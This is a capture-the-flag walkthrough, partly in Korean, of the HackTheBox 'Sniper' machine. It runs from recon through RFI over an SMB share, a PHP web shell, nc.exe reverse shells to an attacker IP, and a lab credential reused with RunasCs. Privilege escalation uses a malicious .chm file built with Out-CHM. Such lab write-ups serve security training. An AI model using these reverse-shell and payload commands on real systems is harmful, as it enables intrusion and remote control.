# Sniper - HackTheBox
## Recon
```bash
sudo nmap -p 80,135,139,445,49667 -sC -sV -vv -oA sniper 10.129.229.6
```
<img width="1207" height="257" alt="image" src="https://github.com/user-attachments/assets/abcf2f48-e56f-47dd-9e5c-8621a95052c4" />

- HTTP(80)
- SMB(445)

---
## HTTP
### banner grabbing
<img width="1207" height="299" alt="image" src="https://github.com/user-attachments/assets/4937536c-5d7e-47a3-ae0d-b31f63534f05" />

### RFI
- 메인페이지에서 `/blog`경로와 `/user`경로로 접속 가능.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/9c64fcdc-789b-46ec-a3d3-0ea257a87116" />
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/d5993b8c-6d0a-495a-aaba-7bf66b784de5" />

<br>
<br>

- `/blog`경로에서 `lang`파라미터를 통해서 언어 변경.
<img width="263" height="47" alt="image" src="https://github.com/user-attachments/assets/dbd5bb14-31d2-4bc0-8c81-e125f9917027" />

<br>
<br>

- `LFI` 시도.
- 브라우저에서는 출력이 제대로 보이지 않으나 `burpsuite`에서는 `LFI` 성공.
<img width="1549" height="822" alt="image" src="https://github.com/user-attachments/assets/eb834685-decf-495d-94ac-7f643cd7547a" />

<br>
<br>

- SMB서버를 생성해서 `RFI`시도하여 성공.
```bash
impacket-smbserver -smb2support test ./test -debug
```
<img width="1204" height="355" alt="image" src="https://github.com/user-attachments/assets/1e3798d9-f714-4e0a-8aa3-6e0851ef5b53" />
<img width="1545" height="754" alt="image" src="https://github.com/user-attachments/assets/ba773b44-0b14-45dc-87f4-da417add2173" />

<br>
<br>

- web sehll 테스트.
```bash
cp /usr/share/webshells/php/simple-backdoor.php .
```
<img width="1549" height="823" alt="image" src="https://github.com/user-attachments/assets/e216a8eb-1214-47fa-a631-065df510a18f" />

<br>
<br>

- `nc.exe`를 실행하여 리버스 셸 생성.
<img width="770" height="301" alt="image" src="https://github.com/user-attachments/assets/8f613dad-a270-4f1f-9e96-afaafb71acff" />

<br>
<br>

- 셸 획득.
<img width="1203" height="228" alt="image" src="https://github.com/user-attachments/assets/cc921d58-2ed0-4001-bdf1-7017bf4a68f2" />

---
## Shell as chris
- `c:\inetpub\wwwroot\user\db.php`에서 계정 획득.
<img width="1203" height="270" alt="image" src="https://github.com/user-attachments/assets/6611c7d9-4d25-4d6d-82c2-a87986c89930" />

<br>
<br>

- 포트포워딩을 생성하여 mysql 접속해보았으나 특별한 정보 찾지 못함.
- `chris`유저의 로그인 시도하여 성공.
```bash
nxc smb 10.129.229.6 -u chris -p 36mEAhz/B8xQ~2VM --local-auth
```
<img width="1203" height="119" alt="image" src="https://github.com/user-attachments/assets/d4cc039a-141c-4f5f-a97d-79739f91d381" />

<br>
<br>

- 로컬로부터 `nc.exe`를 다운로드 받아서 `RunasCs`로 리버스 셸 실행.
```powershell
\\10.10.14.22\test\RunasCs.exe chris 36mEAhz/B8xQ~2VM "c:\temp\nc.exe 10.10.14.22 80 -e cmd.exe"
```
<img width="1203" height="98" alt="image" src="https://github.com/user-attachments/assets/872712dd-ca5f-43b2-99ff-f03b2e8d7ad0" />

<br>
<br>

- 셸 획득.
<img width="1203" height="227" alt="image" src="https://github.com/user-attachments/assets/0609fa6e-d5ef-4173-ae4b-3fc7fed9d578" />

---
## Privesc
- `c:\users\chris\downloads`에서 `insctructions.chm`파일 발견.
<img width="1203" height="272" alt="image" src="https://github.com/user-attachments/assets/42626abf-b888-48ca-bf9b-2043e4545571" />

<br>
<br>

- `C:\Docs\note.txt`에서 문서가 준비되면 해당 경로로 파일을 옮기라는 문구 발견.
<img width="1203" height="204" alt="image" src="https://github.com/user-attachments/assets/b243cbfb-68de-48e2-979f-7bdbc85d4c8c" />

<br>
<br>

- `C:\docs`경로에 `.chm`파일을 생성할 경우 실행할 것이라 가정.
- `Out-CHM.ps1`을 Windows 가상머신에서 실행하여 리버스 셸을 실행하는 `.chm`파일 생성.
```powershell
Out-CHM -Payload "c:\users\chris\downloads\nc.exe 10.10.14.22 4444 -e cmd.exe" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
```
<img width="1007" height="259" alt="image" src="https://github.com/user-attachments/assets/5733b239-43fc-4ce6-bb2e-e80a57763b55" />

<br>
<br>

- `.chm`파일을 `C:\Docs`로 복사.
```powershell
copy \\10.10.14.22\test\doc.chm
```
<img width="1202" height="397" alt="image" src="https://github.com/user-attachments/assets/42ffcc18-e0c2-4b96-9520-a30283ff6f41" />

<br>
<br>

- 셸 획득.
<img width="1202" height="231" alt="image" src="https://github.com/user-attachments/assets/ce818f88-a580-4fc2-8079-965fed3243d0" />

---
## FLAG
- `c:\users\chris\desktop\user.txt`
<img width="1202" height="271" alt="image" src="https://github.com/user-attachments/assets/1176b002-b33e-4c73-b0fe-a1022ce374c1" />

<br>
<br>

- `c:\users\administrator\desktop\root.txt`
<img width="1202" height="164" alt="image" src="https://github.com/user-attachments/assets/98303f90-2e52-4efd-b02a-a58fd2f47f55" />
